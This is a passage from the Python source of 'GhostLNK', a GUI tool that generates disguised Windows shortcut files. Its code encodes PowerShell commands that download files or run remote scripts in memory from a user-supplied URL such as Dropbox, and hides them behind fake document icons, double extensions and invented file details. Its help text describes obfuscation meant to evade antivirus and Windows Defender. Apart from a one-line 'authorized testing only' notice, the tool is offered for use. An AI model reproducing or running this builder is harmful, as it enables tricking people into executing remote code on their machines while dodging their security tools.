                self.pause_cb.setChecked(False)
        else:
            self.debug_cb.setEnabled(True)
            self.pause_cb.setEnabled(True)
    
    def on_stealth_changed(self):
        """Update stealth hint"""
        stealth = self.stealth_combo.currentIndex()
        hints = [
            "Normal: Standard output, visible window",
            "Moderate: Uses aliases, avoids obvious patterns",
            "Maximum: Obfuscated code, no suspicious flags, AV bypass attempt"
        ]
        self.stealth_hint.setText(hints[stealth])
        
        stealth_names = ["None", "Moderate", "Maximum"]
        self.stealth_indicator.setText(f"Stealth: {stealth_names[stealth]}")
        
        self.update_options()
    
    def on_url_changed(self):
        """Handle URL changes"""
        url = self.url_input.text().strip()
        
        # Check Dropbox
        if 'dropbox.com' in url.lower():
            if 'dl=1' not in url:
                self.dropbox_indicator.setText("⚠️ Missing dl=1! Add &dl=1 to the end")
                self.dropbox_indicator.setStyleSheet("color: #ff6666;")
            else:
                self.dropbox_indicator.setText("✓ dl=1 OK")
                self.dropbox_indicator.setStyleSheet("color: #66ff66;")
        else:
            self.dropbox_indicator.setText("")
        
        # Auto-suggest payload type
        if url:
            guessed = PowerShellConverter.guess_payload_type(url)
            if guessed == "memory_execute" and '.ps1' in url.lower():
                self.type_combo.setCurrentIndex(1)
    
    def on_type_changed(self):
        """Update type hint and indicator"""
        types = [
            "📁 Download & Open: Saves file to temp and opens it. Best for PDFs, images, documents.",
            "⚡ Memory Execute: Downloads and runs PowerShell script in memory. For .ps1 files ONLY!",
            "🕵️ Ultra Stealth: Minimal output, just executes."
        ]
        self.type_hint.setText(types[self.type_combo.currentIndex()])
        
        mode_names = ["Download & Open", "Memory Execute", "Ultra Stealth"]
        self.mode_indicator.setText(f"Current Mode: {mode_names[self.type_combo.currentIndex()]}")
    
    def get_payload(self):
        """Get the appropriate payload based on selected type"""
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Warning", "Please enter a URL first")
            return None
        
        pause = self.pause_cb.isChecked()
        debug = self.debug_cb.isChecked()
        stealth = self.stealth_combo.currentIndex()
        mode = self.type_combo.currentIndex()
        
        if mode == 0:
            return PowerShellConverter.create_download_and_open_payload(url, pause, debug, stealth)
        elif mode == 1:
            return PowerShellConverter.create_memory_execute_payload(url, pause, debug, stealth)
        else:
            return PowerShellConverter.create_stealth_payload(url, pause, debug, stealth)
    
    def load_url(self, url):
        self.url_input.setText(url)
        self.log(f"Loaded: {url[:50]}...")
    
    def show_command(self):
        payload = self.get_payload()
        if payload:
            self.cmd_display.setText(payload)
            mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
            stealth = ["Normal", "Moderate", "Maximum"][self.stealth_combo.currentIndex()]
            self.log(f"[✓] Command generated - Mode: {mode}, Stealth: {stealth}")
    
    def encode(self):
        payload = self.get_payload()
        if payload:
            self.cmd_display.setText(payload)
            encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            full_arg = f"-E {encoded}"
            self.arg_display.setText(full_arg)
            
            mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
            stealth = ["Normal", "Moderate", "Maximum"][self.stealth_combo.currentIndex()]
            self.log(f"[✓] Encoded - Mode: {mode}, Stealth: {stealth} | Length: {len(encoded)} chars")
    
    def copy_arg(self):
        arg = self.arg_display.toPlainText().strip()
        if arg:
            QApplication.clipboard().setText(arg)
            self.import_input.setText(arg)
            self.log("[✓] Copied to clipboard")
    
    def use_in_lnk(self):
        arg = self.arg_display.toPlainText().strip()
        if arg:
            self.import_input.setText(arg)
            self.preview_label.setText(f"Arguments: {arg[:100]}...")
            self.log("[✓] Loaded into LNK generator")
    
    def import_arg(self):
        arg = self.import_input.text().strip()
        if arg:
            self.preview_label.setText(f"Arguments: {arg[:100]}...")
            self.log("[✓] Imported argument")
    
    def generate_desc(self):
        date = datetime.now().strftime("%d/%m/%Y")
        icon = self.icon_combo.currentText()
        self.desc_input.setText(f"Type: {icon}\nSize: 1.23 MB\nDate modified: {date}")
    
    def log(self, msg):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.append(f"[{timestamp}] {msg}")
        cursor = self.console.textCursor()
        cursor.movePosition(cursor.MoveOperation.End)
        self.console.setTextCursor(cursor)
        QApplication.processEvents()
    
    def generate_lnk(self):
        try:
            arg = self.import_input.text().strip() or self.arg_display.toPlainText().strip()
            if not arg:
                QMessageBox.warning(self, "Warning", "No -E argument set")
                return
            
            icon = self.icon_combo.currentText()
            icon_path, icon_idx, ext = self.ICON_DATABASE[icon]
            
            name = self.filename_input.text().strip() or "Document"
            ext_choice = self.ext_combo.currentText()
            filename = f"{name}{ext_choice}"
            if self.lnk_cb.isChecked():
                filename += ".lnk"
            
            desc = self.desc_input.toPlainText().strip()
            if not desc:
                self.generate_desc()
                desc = self.desc_input.toPlainText().strip()
            
            save_path, _ = QFileDialog.getSaveFileName(self, "Save LNK File", filename, "LNK Files (*.lnk)")
            if not save_path:
                return
            
            mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
            stealth = self.stealth_combo.currentIndex()
            stealth_names = ["Normal", "Moderate", "Maximum"]
            self.log(f"👻 Generating LNK ({mode}, Stealth: {stealth_names[stealth]})...")
            
            LNKEngine.create_lnk(
                save_path,
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                arg,
                icon_path,
                icon_idx,
                desc,
                stealth_level=stealth
            )
            
            size = os.path.getsize(save_path)
            self.log(f"[✓] LNK saved: {os.path.basename(save_path)} ({size} bytes) - Stealth: {stealth_names[stealth]}")
            
            QMessageBox.information(self, "Success", 
                f"LNK file generated successfully!\n\n"
                f"Path: {save_path}\n"
                f"Mode: {mode}\n"
                f"Stealth: {stealth_names[stealth]}")
            
        except Exception as e:
            self.log(f"❌ Error: {str(e)}")
            QMessageBox.critical(self, "Error", str(e))
    
    def show_mode_guide(self):
        QMessageBox.about(self, "Payload Mode Guide",
            "<b>📁 Download & Open Mode</b><br>"
            "- Saves file to temp folder<br>"
            "- Opens with default application<br>"
            "- Use for: PDFs, images, documents<br><br>"
            
            "<b>⚡ Memory Execute Mode</b><br>"
            "- Downloads and runs PowerShell script in memory<br>"
            "- No files saved to disk<br>"
            "- Use for: .ps1 script files ONLY<br><br>"
            
            "<b>🕵️ Ultra Stealth Mode</b><br>"
            "- Minimal output<br>"
            "- Just executes<br>"
            "- Good for background scripts")
    
    def show_stealth_help(self):
        QMessageBox.about(self, "Stealth Mode Guide",
            "<b>👻 Stealth Levels Explained</b><br><br>"
            
            "<b>Level 0 - Normal:</b><br>"
            "- Standard PowerShell commands<br>"
            "- Visible window with output<br>"
            "- May trigger AV detection<br><br>"
            
            "<b>Level 1 - Moderate Stealth:</b><br>"
            "- Uses aliases (iex instead of Invoke-Expression)<br>"
            "- Avoids obvious patterns<br>"
            "- Minimal output<br>"
            "- Better chance of bypassing AV<br><br>"
            
            "<b>Level 2 - Maximum Stealth (AV Bypass):</b><br>"
            "- Uses obfuscated variable names<br>"
            "- Avoids -WindowStyle Hidden flag<br>"
            "- Uses Start instead of Start-Process<br>"
            "- No comments or unnecessary code<br>"
            "- Best chance of evading detection<br><br>"
            
            "<b>Why the detection happened:</b><br>"
            "- Windows Defender flagged '-WindowStyle Hidden'<br>"
            "- Long encoded commands are suspicious<br>"
            "- Multiple PowerShell flags together<br><br>"
            
            "<b>Maximum Stealth avoids:</b><br>"
            "- No -WindowStyle Hidden flag<br>"
            "- Shorter, obfuscated commands<br>"
            "- No debug output<br>"
            "- Uses aliases instead of full cmdlets")
    
    def show_about(self):
        QMessageBox.about(self, "About GhostLNK",
            "<b>GhostLNK v6.0 - Stealth Mode Edition</b><br><br>"
            "<b>Created by: github.com/Excalibra</b><br><br>"
            "Ultimate LNK Generator with:<br>"
            "✓ Multiple payload types<br>"
            "✓ 3 stealth levels (Normal, Moderate, Maximum)<br>"
            "✓ AV bypass techniques<br>"
            "✓ Dropbox URL validation<br>"
            "✓ Realistic icon disguises<br><br>"
            "<b>Maximum Stealth:</b> Obfuscated commands, no suspicious flags<br><br>"
            "⚠️ For authorized testing only")


def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = GhostLNKGUI()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
